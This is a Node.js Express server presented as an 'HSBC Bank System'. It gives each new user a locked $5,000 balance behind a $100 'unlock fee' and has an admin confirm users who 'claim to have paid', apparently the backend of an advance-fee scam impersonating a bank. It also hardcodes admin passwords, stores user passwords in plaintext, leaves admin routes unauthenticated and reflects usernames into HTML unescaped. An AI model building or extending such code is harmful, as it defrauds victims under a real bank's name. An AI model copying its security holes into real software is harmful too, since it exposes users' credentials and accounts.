const express = require('express');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs'); // Added for permanent storage
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- PERSISTENT DATABASE SETUP ---
const DB_FILE = './database.json';

// Function to read data from the file
function readDatabase() {
    try {
        if (!fs.existsSync(DB_FILE)) {
            const initialData = { users: {}, messages: {} };
            fs.writeFileSync(DB_FILE, JSON.stringify(initialData, null, 2));
            return initialData;
        }
        const data = fs.readFileSync(DB_FILE, 'utf8');
        return JSON.parse(data);
    } catch (err) {
        console.error("Error reading database:", err);
        return { users: {}, messages: {} };
    }
}

// Function to save data to the file
function saveDatabase(data) {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
    } catch (err) {
        console.error("Error saving database:", err);
    }
}

// Initial load
let db = readDatabase();
let users = db.users; 
let messages = db.messages;

// --- AUTHENTICATION ROUTES ---

app.post('/api/register', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ success: false, error: "Fill all fields" });
    
    // Refresh local cache
    db = readDatabase();
    if (db.users[username]) return res.status(400).json({ success: false, error: "User already exists" });

    db.users[username] = {
        password: password,
        name: username,
        walletStatus: "LOCKED", // Initial state
        pendingBalance: 5000.00,
        availableBalance: 0.00,
        unlockFee: 100.00,
        notifiedAdmin: false
    };

    saveDatabase(db);
    console.log(`[REGISTRATION]: New user '${username}' created and saved to database.`);
    res.json({ success: true });
});

app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    db = readDatabase();

    // --- MASTER ADMIN ACCOUNT CHECK ---
    const MASTER_ADMIN_USER = "admin"; 
    const MASTER_ADMIN_PASS = "boss123"; 

    if (username === MASTER_ADMIN_USER && password === MASTER_ADMIN_PASS) {
        return res.json({ 
            success: true, 
            isAdmin: true, 
            redirect: "/admin.html" 
        });
    }

    // --- REGULAR USER CHECK ---
    const user = db.users[username];
    if (user && user.password === password) {
        res.json({ 
            success: true, 
            username: username, 
            isAdmin: false, 
            redirect: "/index.html" 
        });
    } else {
        res.status(401).json({ success: false, error: "Invalid credentials" });
    }
});

// --- BANKING ROUTES ---

app.get('/wallet/:id', (req, res) => {
    db = readDatabase();
    const user = db.users[req.params.id];
    if (!user) return res.status(404).json({ error: "User not found" });
    res.json(user);
});

// USER ACTION: Notify Admin they have paid
app.post('/wallet/:id/request-unlock', (req, res) => {
    db = readDatabase();
    const user = db.users[req.params.id];
    if (!user) return res.status(404).json({ error: "User not found" });

    user.walletStatus = "PENDING_APPROVAL"; // Change state
    user.notifiedAdmin = true;
    
    saveDatabase(db);

    console.log(`\n************************************************`);
    console.log(`ALERT: User '${req.params.id}' claims to have paid!`);
    console.log(`Verify payment and approve at: http://localhost:3000/admin/approve/${req.params.id}`);
    console.log(`************************************************\n`);

    res.json({ 
        success: true, 
        message: "Payment notification sent. Your funds will be released after admin verification." 
    });
});

// --- LIVE CHAT ROUTES ---

app.post('/api/chat/send', (req, res) => {
    const { username, text, isAdmin } = req.body;
    if (!username || !text) return res.status(400).json({ error: "Missing data" });

    db = readDatabase();
    if (!db.messages[username]) db.messages[username] = [];
    
    db.messages[username].push({
        sender: isAdmin ? 'admin' : 'user',
        text: text,
        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    });

    saveDatabase(db);
    console.log(`[CHAT] ${isAdmin ? 'ADMIN' : username}: ${text}`);
    res.json({ success: true });
});

app.get('/api/chat/history/:username', (req, res) => {
    db = readDatabase();
    const history = db.messages[req.params.username] || [];
    res.json(history);
});

// --- ADMIN ROUTES ---

const ADMIN_PASSWORD = "boss";

app.post('/api/admin/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, error: "Unauthorized" });
    }
});

app.get('/api/admin/users/all', (req, res) => {
    db = readDatabase();
    const allUsers = Object.keys(db.users).map(username => ({
        username: username,
        ...db.users[username]
    }));
    res.json(allUsers);
});

app.get('/admin/approve/:username', (req, res) => {
    db = readDatabase();
    const user = db.users[req.params.username];
    if (!user) return res.status(404).send("User not found");

    user.walletStatus = "ACTIVE";
    user.availableBalance = user.pendingBalance;
    user.pendingBalance = 0;
    
    saveDatabase(db);

    console.log(`[ADMIN]: Funds released for ${req.params.username}`);
    res.send(`<h1>Approval Success</h1><p>User <b>${req.params.username}</b> now has access to their $5,000.00.</p>`);
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`-------------------------------------------`);
    console.log(`HSBC Bank System Running (Persistence Enabled)`);
    console.log(`Admin Data: http://localhost:${PORT}/admin.html`);
    console.log(`Database saved to: ${DB_FILE}`);
    console.log(`-------------------------------------------`);
});